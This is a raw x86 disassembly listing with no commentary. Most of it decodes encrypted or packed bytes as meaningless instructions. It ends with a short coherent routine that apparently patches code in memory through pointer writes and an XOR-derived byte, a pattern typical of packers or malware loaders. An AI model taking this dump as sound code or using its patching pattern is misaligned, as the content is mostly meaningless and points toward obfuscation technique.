  4030c2:	add    al,0x2
  4030c4:	outs   dx,BYTE PTR ds:[esi]
  4030c5:	add    esp,esi
  4030c7:	cdq    
  4030c8:	loope  0x403056
  4030ca:	lahf   
  4030cb:	sti    
  4030cc:	out    0xb5,eax
  4030ce:	and    BYTE PTR [ebx],dh
  4030d0:	xchg   ebx,eax
  4030d1:	sub    ah,bl
  4030d3:	and    DWORD PTR [edi+0x49],esp
  4030d6:	push   esp
  4030d7:	mov    dl,BYTE PTR [ebx+0x64cdb6e4]
  4030dd:	push   0xffffff8e
  4030df:	push   edi
  4030e0:	ret    
  4030e1:	arpl   WORD PTR [ebx],di
  4030e3:	jmp    0x40310e
  4030e5:	cwde   
  4030e6:	(bad)  
  4030e7:	cli    
  4030e8:	test   al,0xd6
  4030ea:	mov    edx,DWORD PTR [ebp+esi*1-0x40]
  4030ee:	les    edi,FWORD PTR [edx]
  4030f0:	mov    es:0x893043e3,eax
  4030f6:	int3   
  4030f7:	push   cs
  4030f8:	xchg   edx,eax
  4030f9:	xor    cl,BYTE PTR [ebx]
  4030fb:	cdq    
  4030fc:	or     DWORD PTR [eax],ecx
  4030fe:	or     cl,BYTE PTR ss:[ebx]
  403101:	xor    al,0x72
  403103:	or     eax,0x79ddb566
  403108:	sahf   
  403109:	and    ebp,DWORD PTR [ecx]
  40310b:	cmp    DWORD PTR ds:0x6b5dd486,ebp
  403111:	adc    DWORD PTR [ebx],esp
  403113:	pushf  
  403114:	jmp    0x4030c1
  403116:	out    0x45,al
  403118:	push   ss
  403119:	(bad)  [ebp+0x210955e2]
  40311f:	aas    
  403120:	ss mov eax,0x80854134
  403126:	push   edx
  403127:	inc    edx
  403128:	dec    ebx
  403129:	stc    
  40312a:	or     BYTE PTR [ebx],ah
  40312c:	loopne 0x4030e8
  40312e:	cdq    
  40312f:	neg    DWORD PTR [eax+0x65e8f5d0]
  403135:	push   edx
  403136:	fild   DWORD PTR [ebp-0x141a6cf6]
  40313c:	popa   
  40313d:	pop    ebx
  40313e:	xchg   ecx,eax
  40313f:	xor    al,0x85
  403141:	mov    ds:0x123e81e0,al
  403146:	shr    DWORD PTR [edx-0x36],1
  403149:	dec    ecx
  40314a:	(bad)  
  40314b:	into   
  40314c:	fsubr  st,st(6)
  40314e:	call   0xe8050b22
  403153:	mov    ds:0x42172e38,eax
  403158:	pushf  
  403159:	sahf   
  40315a:	push   0xb850ed7a
  40315f:	leave  
  403160:	xor    BYTE PTR [ebx],dh
  403162:	xchg   DWORD PTR [ebx-0x7e7d06f1],ebx
  403168:	ins    BYTE PTR es:[edi],dx
  403169:	cld    
  40316a:	out    0x66,al
  40316c:	jnp    0x403161
  40316e:	mov    edi,0x1c68d403
  403173:	and    BYTE PTR [esp+ecx*8+0x72],bl
  403177:	push   es
  403178:	and    dh,BYTE PTR [edx-0x32]
  40317b:	sbb    cl,BYTE PTR [esi-0x3ae2691]
  403181:	clc    
  403182:	and    dl,ch
  403184:	and    ah,bh
  403186:	add    DWORD PTR [ebx-0x6f490a7],0x20af3e45
  403190:	jmp    0x4031f1
  403192:	mov    bh,0x52
  403194:	gs fstp st(0)
  403197:	out    0xf5,eax
  403199:	adc    al,0xf2
  40319b:	(bad)  
  40319c:	shl    DWORD PTR [esi+0x57c5d589],1
  4031a2:	(bad)  
  4031a3:	jbe    0x403191
  4031a5:	cdq    
  4031a6:	sbb    BYTE PTR [eax+0x2f],ch
  4031a9:	and    ebp,DWORD PTR [eax+0x1ccd04bb]
  4031af:	inc    ecx
  4031b0:	in     al,dx
  4031b1:	lock stos BYTE PTR es:[edi],al
  4031b3:	(bad)  
  4031b4:	xchg   edi,eax
  4031b5:	dec    edx
  4031b6:	mov    ebx,0xcfd5ce47
  4031bb:	xlat   BYTE PTR fs:[ebx]
  4031bd:	fsub   st,st(1)
  4031bf:	div    BYTE PTR [edx-0x3c5818eb]
  4031c5:	cdq    
  4031c6:	pop    es
  4031c7:	(bad)  
  4031c8:	div    BYTE PTR [edx-0x31]
  4031cb:	push   ecx
  4031cc:	and    ah,BYTE PTR ds:0x3691e0e4
  4031d2:	das    
  4031d3:	mov    edx,fs
  4031d5:	fwait
  4031d6:	imul   esp,edi,0xa7eefb79
  4031dc:	cs int3 
  4031de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031df:	repnz xchg ebp,eax
  4031e1:	loop   0x4031fb
  4031e3:	add    DWORD PTR [eax],ebp
  4031e5:	xchg   ecx,eax
  4031e6:	push   0x23
  4031e8:	sub    al,BYTE PTR [edi-0x20]
  4031eb:	pop    eax
  4031ec:	sub    al,0xf5
  4031ee:	pop    edi
  4031ef:	jae    0x403172
  4031f1:	jb     0x403223
  4031f3:	imul   esi,DWORD PTR [ecx+eiz*8+0x3f7292de],0xa45d8421
  4031fe:	dec    eax
  4031ff:	nop
  403200:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403201:	data16 cld 
  403203:	vpcmpeqb xmm7,xmm0,xmm4
  403207:	jecxz  0x4031c5
  403209:	arpl   WORD PTR [esp+edi*2-0x63a9e0b4],bp
  403210:	lahf   
  403211:	push   ecx
  403212:	inc    ebx
  403213:	ins    DWORD PTR es:[edi],dx
  403214:	inc    eax
  403215:	into   
  403216:	pop    esi
  403217:	sbb    BYTE PTR [edx-0x6747eba2],dh
  40321d:	lds    ecx,FWORD PTR [eax+0x4df2404b]
  403223:	push   ecx
  403224:	daa    
  403225:	sub    BYTE PTR [ebp-0x67],ch
  403228:	mov    ds:0x592313a1,al
  40322d:	(bad)  
  40322e:	mov    ss,WORD PTR [ebp-0x22]
  403231:	xor    esp,DWORD PTR [ebx-0x6d4fac3c]
  403237:	cmp    eax,0x32c6d55e
  40323c:	jmp    0x21d4:0xf51a913d
  403243:	inc    ebp
  403244:	inc    ecx
  403245:	inc    ebx
  403246:	into   
  403247:	loopne 0x40323e
  403249:	pusha  
  40324a:	cld    
  40324b:	mov    ebx,0x10b0101f
  403250:	xor    cx,WORD PTR [ecx]
  403253:	lds    esp,FWORD PTR fs:[edi+0xe]
  403257:	ror    BYTE PTR [ecx-0x62],cl
  40325a:	iret   
  40325b:	rcr    DWORD PTR [ecx+eiz*1],0x54
  40325f:	or     eax,DWORD PTR [edx-0x7c]
  403262:	or     ebp,DWORD PTR ds:0xeb9c1f06
  403268:	and    bl,ah
  40326a:	in     al,dx
  40326b:	push   0x960c62ca
  403270:	scas   eax,DWORD PTR es:[edi]
  403271:	shl    BYTE PTR [edi-0x778bdb83],0x1e
  403278:	push   es
  403279:	mov    dh,0xf0
  40327b:	aam    0x96
  40327d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40327e:	push   0x5c469997
  403283:	jge    0x40324b
  403285:	loopne 0x4032f4
  403287:	add    esp,edx
  403289:	push   cs
  40328a:	xchg   esp,eax
  40328b:	inc    edi
  40328c:	ins    DWORD PTR es:[edi],dx
  40328d:	xchg   ebx,eax
  40328e:	dec    BYTE PTR [edi]
  403290:	add    DWORD PTR [ebx-0x6a8136ac],0x3452823c
  40329a:	jmp    0xbe37:0x2d50d763
  4032a1:	dec    eax
  4032a2:	not    BYTE PTR [edx-0x672ec81]
  4032a8:	mov    al,0xb7
  4032aa:	jne    0x4032cd
  4032ac:	mov    bh,BYTE PTR [esi-0xa]
  4032af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032b0:	sub    DWORD PTR [eax+0x54],ebx
  4032b3:	xlat   BYTE PTR ds:[ebx]
  4032b4:	shr    al,cl
  4032b6:	mov    BYTE PTR [eax],bl
  4032b8:	shr    edx,1
  4032ba:	mov    eax,0x1d27832e
  4032bf:	fs inc ebx
  4032c1:	out    dx,al
  4032c2:	dec    eax
  4032c3:	or     eax,0x783d025
  4032c8:	dec    esi
  4032c9:	mov    cl,0x33
  4032cb:	adc    al,0x8
  4032cd:	add    DWORD PTR [esi-0x5cedd57e],0x4481ff26
  4032d7:	idiv   BYTE PTR [ebx+eax*8-0x183e187f]
  4032de:	mov    dh,0x74
  4032e0:	arpl   WORD PTR [edx+0x29],si
  4032e3:	pop    ebx
  4032e4:	fisttp DWORD PTR [edx]
  4032e6:	nop
  4032e7:	mov    bl,0x6e
  4032e9:	loop   0x403367
  4032eb:	sbb    ah,dl
  4032ed:	mov    edi,0x7db5e34f
  4032f2:	enter  0xbbaf,0xa4
  4032f6:	dec    ebp
  4032f7:	jge    0x40331c
  4032f9:	fsub   QWORD PTR [esi]
  4032fb:	xor    esi,DWORD PTR [esi-0x54]
  4032fe:	mov    fs,WORD PTR [ecx+0x65]
  403301:	or     BYTE PTR [ebp-0x2614d5e5],ah
  403307:	sti    
  403308:	pop    esi
  403309:	mov    ebx,0xb6b60eb3
  40330e:	and    ch,ah
  403310:	mov    eax,ds:0x4f9a7ba2
  403315:	hlt    
  403316:	xchg   esp,eax
  403317:	pop    ds
  403318:	rol    DWORD PTR [ebp+0xa],0xd7
  40331c:	loopne 0x403360
  40331e:	mov    ds,WORD PTR [ecx-0x7d]
  403321:	bound  edx,QWORD PTR ds:[ecx+ebp*2-0x7d]
  403326:	sbb    al,0xc6
  403328:	je     0x4032e0
  40332a:	pop    esi
  40332b:	mov    bh,0x80
  40332d:	xchg   esp,eax
  40332e:	and    BYTE PTR [edx],cl
  403330:	xor    DWORD PTR [edx],eax
  403332:	push   cs
  403333:	ret    0x3c5a
  403336:	mov    edx,0xfbad533b
  40333b:	loope  0x4032f6
  40333d:	jb     0x4032e3
  40333f:	aaa    
  403340:	inc    ebx
  403341:	push   edi
  403342:	push   ecx
  403343:	sub    DWORD PTR [edx-0x13],eax
  403346:	xchg   ecx,eax
  403347:	(bad)  
  403348:	neg    DWORD PTR [esi+edx*1]
  40334b:	(bad)  
  40334d:	push   esp
  40334e:	div    DWORD PTR [eax-0x70609c46]
  403354:	jp     0x4033aa
  403356:	dec    BYTE PTR [ebp-0x2e02ce21]
  40335c:	dec    ecx
  40335d:	retf   0xf5ad
  403360:	push   esi
  403361:	mov    edi,0x4de7fc69
  403366:	jmp    0x4032fe
  403368:	jns    0x403378
  40336a:	sub    al,0xf4
  40336c:	cmp    ch,BYTE PTR [esi+0x2c4c76d4]
  403372:	into   
  403373:	and    edx,0x394219d4
  403379:	pop    ebx
  40337a:	xor    al,0x10
  40337c:	(bad)  
  40337d:	(bad)  
  40337e:	neg    BYTE PTR [ebp+0x5afbbe1e]
  403384:	xchg   DWORD PTR [edi-0x71],ebx
  403387:	outs   dx,DWORD PTR cs:[esi]
  403389:	arpl   WORD PTR [ecx+eax*4],dx
  40338c:	inc    eax
  40338d:	jnp    0x4033dc
  40338f:	in     al,0x58
  403391:	pop    edi
  403392:	push   ebp
  403393:	loopne 0x4033ba
  403395:	mov    edx,0x52947ed7
  40339a:	loopne 0x403328
  40339c:	shl    DWORD PTR [eax-0x4f],cl
  40339f:	inc    edx
  4033a0:	jo     0x4033dd
  4033a2:	and    eax,0x901bd317
  4033a7:	repnz or dl,BYTE PTR [ebp+eiz*1+0x73]
  4033ac:	mov    ebx,0x789ac730
  4033b1:	mov    DWORD PTR [edi+0x5dc669f],esi
  4033b7:	adc    al,0xc6
  4033b9:	pop    esp
  4033ba:	or     eax,0xab020e65
  4033bf:	adc    BYTE PTR [eax],bh
  4033c1:	mov    BYTE PTR [edx-0x5017a924],al
  4033c7:	sub    esi,edi
  4033c9:	iret   
  4033ca:	mov    ah,0x92
  4033cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033cd:	push   cs
  4033ce:	rcl    BYTE PTR [edi],1
  4033d0:	push   ss
  4033d1:	cli    
  4033d2:	fsub   QWORD PTR [edi+0x73]
  4033d5:	fnstenv [ebx-0x7d6f11ec]
  4033db:	imul   esp,DWORD PTR [ebx-0x3e],0x1dd801c5
  4033e2:	inc    eax
  4033e3:	not    BYTE PTR [ebp+0x37]
  4033e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033e7:	mov    bl,al
  4033e9:	cwde   
  4033ea:	jns    0x403371
  4033ec:	jp     0x403401
  4033ee:	test   DWORD PTR [ecx-0x9da634a],esi
  4033f4:	int    0x49
  4033f6:	mov    cl,0xcb
  4033f8:	adc    al,0xc6
  4033fa:	push   ebx
  4033fb:	jbe    0x40341a
  4033fd:	neg    DWORD PTR [edx]
  4033ff:	int    0x3
  403401:	xor    eax,0x7fed3a04
  403406:	nop
  403407:	imul   esi
  403409:	imul   ebx,DWORD PTR ds:[esi+0xf3a8dd0],0x27805346
  403414:	push   ebp
  403415:	mov    esi,0x173eb69f
  40341a:	setnp  BYTE PTR gs:[edi+0x190be003]
  403422:	sbb    eax,ebp
  403424:	sbb    dl,BYTE PTR [edx-0x5834a311]
  40342a:	xchg   ebp,eax
  40342b:	ficomp WORD PTR [ebx-0x60967477]
  403431:	popf   
  403432:	fldcw  WORD PTR [esi+0x5f]
  403435:	div    DWORD PTR [eax]
  403437:	das    
  403438:	(bad)  
  403439:	jae    0x4033f8
  40343b:	popf   
  40343c:	mov    eax,ds:0x7dcdcfa1
  403441:	in     eax,0x54
  403443:	fdivr  st(3),st
  403445:	push   cs
  403446:	cmp    ebp,eax
  403448:	mov    WORD PTR [edx-0x52b355c7],?
  40344e:	push   cs
  40344f:	test   BYTE PTR [edi+ebx*4+0x74],bh
  403453:	mov    dx,0x7736
  403457:	lods   eax,DWORD PTR ds:[esi]
  403458:	jmp    0x64f8a29
  40345d:	pop    ds
  40345e:	add    dh,BYTE PTR [ebx+ecx*4+0x20c57512]
  403465:	push   ebx
  403466:	out    0x8c,eax
  403468:	rol    BYTE PTR [edx+0x8],1
  40346b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40346c:	mov    esp,DWORD PTR [edx+ebp*4]
  40346f:	ret    
  403470:	push   0x65
  403472:	aas    
  403473:	aam    0xd2
  403475:	scas   al,BYTE PTR es:[edi]
  403476:	mov    al,ds:0x227d7062
  40347b:	scas   al,BYTE PTR es:[edi]
  40347c:	stos   DWORD PTR es:[edi],eax
  40347d:	sti    
  40347e:	icebp  
  40347f:	dec    edi
  403480:	add    cl,bl
  403482:	fldcw  WORD PTR [ecx+0x53b816e3]
  403488:	add    ah,BYTE PTR [ebx-0x31b376ee]
  40348e:	test   al,dh
  403490:	fsub   st(5),st
  403492:	pop    es
  403493:	xchg   edx,eax
  403494:	shr    DWORD PTR [ebp+0xbad2c77],0x90
  40349b:	ds loopne 0x4034ee
  40349e:	call   0x7751:0x13190420
  4034a5:	lahf   
  4034a6:	dec    edi
  4034a7:	dec    ebx
  4034a8:	test   DWORD PTR [ecx+0x4fed4a83],esi
  4034ae:	retf   
  4034af:	arpl   WORD PTR [ebx],cx
  4034b1:	mov    ch,0xc
  4034b3:	les    ecx,FWORD PTR ds:0x99c1fb97
  4034b9:	jge    0x40353a
  4034bb:	leave  
  4034bc:	push   0xffffff9d
  4034be:	nop
  4034bf:	mov    BYTE PTR [ebp-0x6],dh
  4034c2:	cmp    DWORD PTR [eax+0x228b92d7],edx
  4034c8:	ins    DWORD PTR es:[edi],dx
  4034c9:	mov    al,ds:0x62a47d13
  4034ce:	xchg   BYTE PTR [edx],bh
  4034d0:	cwde   
  4034d1:	leave  
  4034d2:	retf   
  4034d3:	leave  
  4034d4:	sub    eax,DWORD PTR [edi]
  4034d6:	add    al,0x3e
  4034d8:	(bad)  
  4034d9:	outs   dx,DWORD PTR ds:[esi]
  4034da:	xor    BYTE PTR [edi-0x67a8900c],ch
  4034e0:	pop    ds
  4034e1:	leave  
  4034e2:	clc    
  4034e3:	sub    al,0x59
  4034e5:	mov    eax,ds:0xc6013a8a
  4034ea:	dec    esi
  4034eb:	aam    0xa7
  4034ed:	rcr    bh,cl
  4034ef:	cmp    al,0x53
  4034f1:	test   eax,0x8f7d5574
  4034f6:	in     eax,dx
  4034f7:	jp     0x403492
  4034f9:	retf   0x9f25
  4034fc:	jmp    0x9ecb:0x85853e3d
  403503:	add    eax,0x51117eef
  403508:	shl    BYTE PTR [edi+0x13f76b1b],1
  40350e:	out    0x8e,al
  403510:	add    ebp,DWORD PTR [esi-0x2]
  403513:	test   DWORD PTR [ebp-0x40bfba3b],esp
  403519:	retf   
  40351a:	and    eax,0x221f2b07
  40351f:	add    DWORD PTR [ebp+0x73ba86da],0x2d409182
  403529:	mov    al,ds:0xd2e16bf6
  40352e:	out    dx,eax
  40352f:	or     eax,0x3f2d180
  403534:	mov    cl,0x69
  403536:	cs je  0x40356f
  403539:	stc    
  40353a:	inc    eax
  40353b:	jle    0x403510
  40353d:	ds inc esp
  40353f:	shl    eax,cl
  403541:	mov    al,0x37
  403543:	bound  esp,QWORD PTR [edx]
  403545:	or     DWORD PTR [edx],esi
  403547:	xor    al,0x3e
  403549:	add    al,0x9f
  40354b:	and    BYTE PTR [ebx+0x49c520f9],0x2c
  403552:	xor    DWORD PTR [edi+esi*2],ecx
  403555:	and    eax,0xd68c8a35
  40355a:	jno    0x403509
  40355c:	pop    eax
  40355d:	fstp   QWORD PTR [esi]
  40355f:	retf   
  403560:	sahf   
  403561:	inc    esi
  403562:	(bad)  
  403563:	loope  0x40356c
  403565:	rcl    BYTE PTR [edi+0x32335da],0xe2
  40356c:	or     eax,0x75534cd3
  403571:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403572:	or     dl,BYTE PTR [esi-0xc4f4f2c]
  403578:	bswap  esi
  40357a:	clc    
  40357b:	(bad)  
  40357d:	add    DWORD PTR [eax-0x2398afb1],ecx
  403583:	mov    edx,0x9ee017b7
  403588:	rol    BYTE PTR [ebp+0x7b],cl
  40358b:	aaa    
  40358c:	pop    esi
  40358d:	mov    ecx,0x68d1c4c8
  403592:	mov    esp,0x96a97372
  403597:	scas   al,BYTE PTR es:[edi]
  403598:	sti    
  403599:	jne    0x40355d
  40359b:	or     ecx,ecx
  40359d:	cwde   
  40359e:	sbb    ebp,DWORD PTR [esp+ebp*1-0x37]
  4035a2:	jge    0x403616
  4035a4:	aaa    
  4035a5:	stos   DWORD PTR es:[edi],eax
  4035a6:	xor    edx,DWORD PTR [ebx+0x79e881d]
  4035ac:	jp     0x4035eb
  4035ae:	or     DWORD PTR [edx+ebp*4+0x46],ecx
  4035b2:	lahf   
  4035b3:	adc    bh,dh
  4035b5:	xor    dh,BYTE PTR [esi]
  4035b7:	xchg   ebp,eax
  4035b8:	in     eax,dx
  4035b9:	mul    BYTE PTR [ebx]
  4035bb:	add    eax,0xcef50daa
  4035c0:	js     0x403583
  4035c2:	lahf   
  4035c3:	fld    DWORD PTR [esi]
  4035c5:	or     edi,DWORD PTR [edx+0x79]
  4035c8:	jmp    0xf69c:0xf0c42a14
  4035cf:	dec    eax
  4035d0:	cmp    al,0x88
  4035d2:	sbb    BYTE PTR [esi],ah
  4035d4:	cli    
  4035d5:	mov    al,0x47
  4035d7:	mov    dh,bh
  4035d9:	jmp    0x403597
  4035db:	stc    
  4035dc:	in     al,dx
  4035dd:	stos   DWORD PTR es:[edi],eax
  4035de:	adc    dl,ch
  4035e0:	xchg   edi,eax
  4035e1:	fwait
  4035e2:	mov    BYTE PTR [edi],dh
  4035e4:	ins    DWORD PTR es:[edi],dx
  4035e5:	pop    esp
  4035e6:	(bad)  
  4035e8:	or     DWORD PTR [ebx*2+0x19c3700b],esp
  4035ef:	mov    ss,WORD PTR [ebp+0x2e]
  4035f2:	scas   al,BYTE PTR es:[edi]
  4035f3:	or     BYTE PTR [ecx],dh
  4035f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035f6:	(bad)  
  4035f7:	aaa    
  4035f8:	xor    al,0x7b
  4035fa:	push   ss
  4035fb:	jae    0x4035ff
  4035fd:	in     eax,dx
  4035fe:	das    
  4035ff:	mov    dl,0x94
  403601:	push   ecx
  403602:	jae    0x4035b2
  403604:	repnz rol BYTE PTR [ecx],1
  403607:	fsubr  QWORD PTR [edi+eax*4]
  40360a:	or     al,0xc4
  40360c:	adc    BYTE PTR [esi],dh
  40360e:	fisub  DWORD PTR [ebp+0x3dad2785]
  403614:	ret    
  403615:	xchg   esi,eax
  403616:	popf   
  403617:	jo     0x403648
  403619:	pop    ds
  40361a:	mov    bh,0x18
  40361c:	cmp    edi,DWORD PTR [eax+0x531d34a9]
  403622:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403623:	cmp    DWORD PTR ds:0x10cf9970,edx
  403629:	cld    
  40362a:	mov    ebp,0xf205a262
  40362f:	jge    0x403668
  403631:	cld    
  403632:	jae    0x4035ee
  403634:	ret    0x8bd3
  403637:	(bad)  
  403638:	inc    BYTE PTR [ebx]
  40363a:	fdiv   st(5),st
  40363c:	arpl   WORD PTR [eax],di
  40363e:	pop    es
  40363f:	(bad)  
  403640:	adc    eax,0x95ef438e
  403645:	push   dx
  403647:	adc    BYTE PTR [esi-0x67],dl
  40364a:	push   0xffffff95
  40364c:	clc    
  40364d:	bound  eax,QWORD PTR ds:0xe1fad4e0
  403653:	movlps xmm6,QWORD PTR [esi+0x3b15d743]
  40365a:	mov    esi,0xaa271a12
  40365f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403660:	mov    dh,BYTE PTR [edx-0x77]
  403663:	(bad)  
  403664:	pop    ss
  403665:	or     edx,DWORD PTR [ecx+edi*1-0x6a9feefc]
  40366c:	jp     0x40364d
  40366e:	jmp    0x4035f6
  403670:	cmp    al,0xbb
  403672:	(bad)  
  403673:	popf   
  403674:	sub    BYTE PTR [ecx+ebp*1-0x4fd5cac4],bl
  40367b:	inc    edx
  40367c:	inc    edx
  40367d:	inc    esi
  40367e:	jae    0x403655
  403680:	idiv   DWORD PTR [eax-0x605f6028]
  403686:	call   0xc3b165de
  40368b:	pop    esi
  40368c:	push   ds
  40368d:	mov    cl,BYTE PTR [ebx-0x6a197cd5]
  403693:	add    al,0xd2
  403695:	jl     0x403641
  403697:	lods   al,BYTE PTR es:[esi]
  403699:	cmp    esi,DWORD PTR [edx-0x383eb4fc]
  40369f:	mov    BYTE PTR [eax],dl
  4036a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036a2:	stos   BYTE PTR es:[edi],al
  4036a3:	add    BYTE PTR [edi+0x77],0xed
  4036a7:	fidiv  WORD PTR [ebp+edx*1-0x11]
  4036ab:	fsub   st,st(7)
  4036ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036ae:	in     eax,0x46
  4036b0:	and    eax,0xa12d37da
  4036b5:	(bad)  
  4036b6:	push   edx
  4036b7:	neg    BYTE PTR [ebx+0x7942bb7d]
  4036bd:	jmp    0x475c:0x2c856926
  4036c4:	cli    
  4036c5:	xchg   ebp,eax
  4036c6:	pop    edx
  4036c7:	(bad)  
  4036c8:	aad    0xa5
  4036ca:	pop    ebx
  4036cb:	clc    
  4036cc:	fcomp  DWORD PTR [ebx-0x7f]
  4036cf:	dec    esi
  4036d0:	sub    DWORD PTR ds:0x7df97477,edx
  4036d6:	mov    dl,0xc6
  4036d8:	push   cs
  4036d9:	popf   
  4036da:	xor    eax,0x37e7687c
  4036df:	sahf   
  4036e0:	mov    dl,BYTE PTR [ecx+esi*4+0x15]
  4036e4:	pop    esi
  4036e5:	lahf   
  4036e6:	push   ds
  4036e7:	jb     0x403754
  4036e9:	fstp   DWORD PTR [esi]
  4036eb:	push   cs
  4036ec:	xor    BYTE PTR [edi+0x59eb5cf9],dl
  4036f2:	cmp    dl,bl
  4036f4:	xchg   edx,eax
  4036f5:	dec    ebx
  4036f6:	jl     0x403731
  4036f8:	xor    al,0xf2
  4036fa:	ficomp WORD PTR [ebp+0x79]
  4036fd:	adc    al,0x8a
  4036ff:	push   esp
  403700:	or     eax,0x83e88379
  403705:	cmp    al,0x24
  403707:	sbb    al,0x7e
  403709:	inc    ecx
  40370a:	shl    DWORD PTR [eax],1
  40370c:	and    dh,BYTE PTR [edi]
  40370e:	(bad)  
  403710:	pop    ecx
  403711:	in     al,dx
  403712:	cdq    
  403713:	loopne 0x4036e4
  403715:	xchg   esi,eax
  403716:	pushf  
  403717:	jo     0x403790
  403719:	add    ecx,DWORD PTR [eax-0x19]
  40371c:	mov    al,ds:0xa863cc96
  403721:	add    BYTE PTR [eax],dl
  403723:	aam    0x2c
  403725:	pop    ebx
  403726:	pusha  
  403727:	fiadd  WORD PTR [edx-0x2e6ea29]
  40372d:	das    
  40372e:	shl    DWORD PTR ds:0x300538da,0x69
  403735:	in     al,dx
  403736:	and    al,0xa0
  403738:	or     DWORD PTR [ebp+0x31dd294c],0xb2c1c49f
  403742:	mov    dh,0xb1
  403744:	cmovle ebp,DWORD PTR [edx+ecx*4]
  403748:	(bad)  
  403749:	jae    0x4036fe
  40374b:	jle    0x403790
  40374d:	cmp    dl,bh
  40374f:	jo     0x4036e2
  403751:	inc    ebx
  403752:	push   eax
  403753:	push   eax
  403754:	je     0x4037af
  403756:	cmp    ch,BYTE PTR [ecx]
  403758:	jns    0x40377c
  40375a:	push   edi
  40375b:	pop    esp
  40375c:	sub    ebp,DWORD PTR [edx-0x36]
  40375f:	jo     0x4036ea
  403761:	pop    ss
  403762:	mov    esi,0xbd5f7a1b
  403767:	xchg   BYTE PTR [esi],ch
  403769:	jecxz  0x403722
  40376b:	pop    edx
  40376c:	mov    al,ds:0xbed0dc7b
  403771:	mul    BYTE PTR [ebp-0x50]
  403774:	push   cs
  403775:	sbb    dh,BYTE PTR [ebp+0x78]
  403778:	jne    0x403778
  40377a:	mov    ds:0x589c999e,al
  40377f:	xor    BYTE PTR [eax+0x2eee11ad],0x11
  403786:	gs mov dl,0xd5
  403789:	in     eax,dx
  40378a:	enter  0x6fe0,0x78
  40378e:	cld    
  40378f:	call   0x8cdcdb4a
  403794:	aad    0x95
  403796:	call   0x1912ef44
  40379b:	pop    esi
  40379c:	or     DWORD PTR [eax],0x7e
  40379f:	dec    ebx
  4037a0:	pop    ebx
  4037a1:	sub    cl,BYTE PTR [ecx-0x4f]
  4037a4:	mov    dl,0xad
  4037a6:	adc    esp,DWORD PTR ds:0xda7f2e61
  4037ac:	cmp    DWORD PTR [esi],0xffffff8a
  4037af:	ins    BYTE PTR es:[edi],dx
  4037b0:	sbb    BYTE PTR [ecx],dh
  4037b2:	in     al,0x26
  4037b4:	xchg   edx,eax
  4037b5:	mov    ds:0x708a63d9,al
  4037ba:	sub    al,0xe1
  4037bc:	arpl   WORD PTR [edi+0x65],sp
  4037bf:	fstp   TBYTE PTR [ecx]
  4037c1:	pop    ebx
  4037c2:	pop    eax
  4037c3:	mov    dh,0x27
  4037c5:	inc    ebx
  4037c6:	add    eax,0x1dc5bb93
  4037cb:	rcr    ebx,0x91
  4037ce:	push   ss
  4037cf:	hlt    
  4037d0:	dec    eax
  4037d1:	xchg   esi,eax
  4037d2:	lds    ebp,FWORD PTR [eax+eiz*4+0x38c0ada]
  4037d9:	outs   dx,BYTE PTR ds:[esi]
  4037da:	gs aad 0x31
  4037dd:	sub    eax,0x9953b115
  4037e2:	aam    0x49
  4037e4:	xor    al,0xf5
  4037e6:	ins    BYTE PTR es:[edi],dx
  4037e7:	pusha  
  4037e8:	push   ecx
  4037e9:	daa    
  4037ea:	ds mov cs,esi
  4037ed:	icebp  
  4037ee:	call   0x41ae62
  4037f3:	test   eax,eax
  4037f5:	je     0x403826
  4037fb:	lea    eax,[ebp-0x90]
  403801:	push   eax
  403802:	mov    eax,DWORD PTR [ebp-0x30]
  403805:	xor    eax,esi
  403807:	add    eax,edi
  403809:	push   eax
  40380a:	mov    eax,DWORD PTR [ebp-0x2c]
  40380d:	add    eax,0xaa
  403812:	push   eax
  403813:	mov    eax,DWORD PTR [ebp-0x2c]
  403816:	mov    eax,DWORD PTR [eax+0x198]
  40381c:	push   DWORD PTR [eax]
  40381e:	call   0x405c89
  403823:	mov    DWORD PTR [ebp-0x40],eax
  403826:	lea    eax,[ebp+0x4]
  403829:	mov    DWORD PTR [ebp-0x34],eax
  40382c:	mov    eax,DWORD PTR [ebp-0x8]
  40382f:	mov    eax,DWORD PTR [eax]
  403831:	mov    eax,DWORD PTR [eax]
  403833:	mov    eax,DWORD PTR [eax]
  403835:	test   eax,eax
  403837:	je     0x405c7a
  40383d:	lea    eax,[ebp-0xc]
  403840:	mov    DWORD PTR [ebp-0x4c],eax
  403843:	mov    eax,DWORD PTR [ebp-0x3c]
  403846:	mov    DWORD PTR [ebp-0xc],eax
  403849:	mov    eax,DWORD PTR [ebp-0x8]
  40384c:	mov    eax,DWORD PTR [eax]
  40384e:	mov    eax,DWORD PTR [eax]
  403850:	mov    eax,DWORD PTR [eax]
  403852:	sub    DWORD PTR [ebp-0xc],eax
  403855:	mov    ecx,DWORD PTR [ebp-0x10]
  403858:	xor    ecx,esi
  40385a:	mov    eax,0xffcd8d25
  40385f:	sub    eax,ecx
  403861:	add    DWORD PTR [ebp-0xc],eax
  403864:	mov    eax,DWORD PTR [ebp-0xc]
  403867:	mov    ecx,DWORD PTR [ebp-0x8]
  40386a:	mov    ecx,DWORD PTR [ecx]
  40386c:	mov    ecx,DWORD PTR [ecx]
  40386e:	mov    ecx,DWORD PTR [ecx]
  403870:	mov    DWORD PTR [ecx+0x1],eax
  403873:	mov    al,BYTE PTR [ebp-0x1]
  403876:	mov    ecx,DWORD PTR [ebp-0x8]
  403879:	mov    ecx,DWORD PTR [ecx]
  40387b:	mov    ecx,DWORD PTR [ecx]
  40387d:	mov    ecx,DWORD PTR [ecx]
  40387f:	push   DWORD PTR [ebp-0x2c]
  403882:	xor    al,0x6f
  403884:	sub    al,0xd
  403886:	mov    BYTE PTR [ecx],al
  403888:	jmp    0x405c4a
  40388d:	lods   eax,DWORD PTR ds:[esi]
  40388e:	mov    bh,0xe6
  403890:	ja     0x403876
